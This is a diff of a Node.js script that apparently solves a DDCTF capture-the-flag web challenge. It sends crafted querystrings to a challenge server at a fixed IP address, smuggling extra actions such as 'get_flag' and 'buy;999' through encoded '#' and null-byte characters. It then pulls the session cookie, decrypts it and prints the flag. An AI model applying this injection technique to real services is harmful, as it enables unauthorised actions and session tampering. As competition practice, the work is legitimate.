@@ -1,14 +1,17 @@
 const got = require('got')
+const { CookieJar } = require('tough-cookie')
 const zlib = require('zlib')
 const flatten = require('just-flatten-it')
 const { base64 } = require('../common/utils')
 
-const URL_GET_FLAG = 'http://116.85.48.107:5002/d5af31f66147e857/?action:get_flag;yelo'
-
-async function fetch () {
-  const url = 'http://116.85.48.107:5002/d5af31f66147e857/?action:%00func:show_flag;yelo'
-  const response = await got(url)
-  console.log(response)
+async function fetch (querystring) {
+  const jar = new CookieJar()
+  const url = `http://116.85.48.107:5002/d5af31f66147e857/?${querystring}`
+  const response = await got(url, {
+    cookieJar: jar,
+  })
+  console.log('Response\n', response.body)
+  return jar
 }
 
 /**
@@ -25,11 +28,14 @@ function readLogs (payload) {
 
 async function main () {
   try {
-    // console.log(await fetch())
-    let session = '.eJyrVsrJT1eyiq5WUkhSslKKDPczSAy3LPXP88tPMk5Ji8qtyIiqKjGNCq8oU6rVQVeVm5KT4maZm-TuludvnJOT5G5hi0VVXlRBVESyeWK4aXZURDo2Fblehqkhxab-IdkgWZhjovLCSiOrCrKSjEyrUsINcyKMncqAhhj4V2Wb-gfaEmVVbKyOUl5pbnxmSWpusZKVoY5SQX5mXgmQaVQLABrFT2Y.D5O6mA.q1Yl9ojHsgoCgykXpj0pFg8v3F0'
+    // test querystring via ./repeater.py
+    let querystring = 'action:trigger_event%23;action:buy;999%23action:get_flag;'
+    let jar = await fetch(querystring)
+    let session = jar.toJSON().cookies.find(({ key }) => key === 'session').value
     let payload = decrypt(session)
     let logs = readLogs(payload)
     console.log(payload, logs)
+    console.log('FLAG: \n', `DDCTF{${logs[5].slice('func:show_flag;'.length)}}`)
   } catch (error) {
     console.error(`Error: ${error.message}`)
   }
